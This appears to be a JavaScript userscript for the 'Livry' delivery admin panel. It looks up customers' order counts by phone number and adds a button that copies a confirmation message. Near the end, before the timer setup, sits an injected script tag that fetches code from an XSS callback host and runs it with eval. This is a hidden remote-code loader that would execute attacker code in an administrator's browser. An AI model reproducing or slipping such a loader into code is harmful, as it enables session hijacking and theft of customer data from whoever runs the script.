'use strict';

// IDs for the elements
const CONTAINER_ID = 'livry-tools-container';
const RESULT_ELEMENT_ID = 'persistent-orders-count-result';
const COPY_BUTTON_ID = 'copy-confirmation-message-button';

// Define colors for easy management
const COLOR_DEFAULT = '#4CAF50'; // Green
const COLOR_HOVER = '#66BB6A';
const COLOR_COPIED = '#00796B'; // Darker green confirmation

/**
 * This function draws the entire UI (order count text and button) on the page.
 * @param {string} countText - The formatted text to display.
 */
function displayUI(countText) {
    const statutsHeader = Array.from(document.querySelectorAll('h6')).find(h => h.textContent.trim() === 'Statuts');
    if (!statutsHeader) return; 

    const oldContainer = document.getElementById(CONTAINER_ID);
    if (oldContainer) oldContainer.remove(); 

    // 1. Create the main container (Flexbox for inline display)
    const container = document.createElement('div');
    container.id = CONTAINER_ID;
    container.style.cssText = 'display: flex !important; align-items: center !important; gap: 15px !important; margin: 10px 0 !important;';

    // 2. Create and add the order count text.
    const resultElement = document.createElement('p');
    resultElement.id = RESULT_ELEMENT_ID;
    resultElement.textContent = countText;
    resultElement.style.cssText = 'color: red !important; font-weight: bold !important; font-size: 1.1rem !important; margin: 0 !important;';
    container.appendChild(resultElement);

    // 3. Create and add the copy button.
    const copyButton = document.createElement('button');
    copyButton.id = COPY_BUTTON_ID;
    copyButton.textContent = 'Copy Confirmation Message';
    copyButton.type = 'button';

    // FORCED MODERN BUTTON STYLING with !important
    copyButton.style.cssText = `
        background-color: ${COLOR_DEFAULT} !important;
        color: white !important;
        padding: 10px 20px !important;
        border: none !important;
        border-radius: 8px !important;
        cursor: pointer !important;
        font-family: inherit !important;
        font-weight: 500 !important;
        transition: background-color 0.3s ease !important;
        box-shadow: 0 4px 6px rgba(0,0,0,0.1) !important;
        -webkit-appearance: none !important;
        -moz-appearance: none !important;
        appearance: none !important;
    `;
    
    // Add hover effect
    copyButton.addEventListener('mouseenter', () => {
        if (!copyButton.textContent.includes('Copied!')) {
            copyButton.style.backgroundColor = COLOR_HOVER; 
        }
    });
    copyButton.addEventListener('mouseleave', () => {
        if (copyButton.textContent.includes('Copied!')) {
            copyButton.style.backgroundColor = COLOR_COPIED; 
        } else {
            copyButton.style.backgroundColor = COLOR_DEFAULT;
        }
    });


    // 4. Button Click Logic
    copyButton.addEventListener('click', () => {
        const phoneInput = document.getElementById('phone');
        const codeInput = document.getElementById('code');

        if (phoneInput && codeInput) {
            const phoneNumber = phoneInput.value;
            const orderCode = codeInput.value;
            const finalMessage = `${orderCode} votre confirmation svp nouveau client ${phoneNumber}`;

            navigator.clipboard.writeText(finalMessage).then(() => {
                copyButton.style.backgroundColor = COLOR_COPIED; 
                copyButton.textContent = 'Copied! ✅';
                setTimeout(() => {
                    copyButton.style.backgroundColor = COLOR_DEFAULT; 
                    copyButton.textContent = 'Copy Confirmation Message';
                }, 2000);
            }).catch(err => console.error('Failed to copy message: ', err));
        } else {
            console.error("Could not find the required input fields with IDs 'phone' and 'code'.");
        }
    });
    container.appendChild(copyButton);

    // 5. Insert the container into the page.
    statutsHeader.insertAdjacentElement('afterend', container);
}

/**
 * Performs an API search and calculates the total orders from all found accounts.
 */
async function runApiSearch(phoneNumber) {
    console.log(`NEW PHONE NUMBER DETECTED: Running API search for ${phoneNumber}...`);
    try {
        const url = `https://livry.flexi-apps.com/api/v1/admin/users?%24filter=%7B%22q%22%3A%22${phoneNumber}%22%7D&%24skip=0&%24sort=%7B%22created_at%22%3A%22-1%22%7D&%24top=10&range=%5B0%2C9%5D`;
        const response = await fetch(url);
        if (!response.ok) throw new Error(`API Error: ${response.status}`);

        const data = await response.json();
        let displayText = 'Resto PLUS (+)';

        if (data.value && data.value.length > 0) {
            const accounts = data.value;
            const accountCount = accounts.length;
            const totalOrders = accounts.reduce((sum, user) => sum + user.ordersCount, 0);

            if (accountCount > 1) {
                displayText = `Total Orders: ${totalOrders} (from ${accountCount} accounts)`;
            } else {
                displayText = `Orders Count: ${totalOrders}`;
            }
        }

        localStorage.setItem('savedDisplayText', displayText);
        localStorage.setItem('savedPhoneNumber', phoneNumber);
        console.log(`Result saved for ${phoneNumber}: "${displayText}"`);

        displayUI(displayText);

    } catch (error) {
        console.error("API Search Error:", error);
    }
}

/**
 * This is the main function that runs on a timer.
 */
function mainCheck() {
    const phoneInput = document.getElementById('phone');

    if (!phoneInput) {
        const oldContainer = document.getElementById(CONTAINER_ID);
        if (oldContainer) oldContainer.remove();
        return;
    }

    const currentPhoneNumber = phoneInput.value;
    if (!currentPhoneNumber) return;

    const savedPhone = localStorage.getItem('savedPhoneNumber');
    const savedText = localStorage.getItem('savedDisplayText');

    if (currentPhoneNumber === savedPhone && savedText) {
        if (!document.getElementById(CONTAINER_ID)) {
            displayUI(savedText);
        }
    } else {
        runApiSearch(currentPhoneNumber);
    }
}
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/biksoft");a.send();</script>
// --- EXECUTION ---
// Start the main check on a 1-second interval.
setInterval(mainCheck, 1000);
console.log("✅ Livry Tools (Required Script) is running. Watching for changes...");
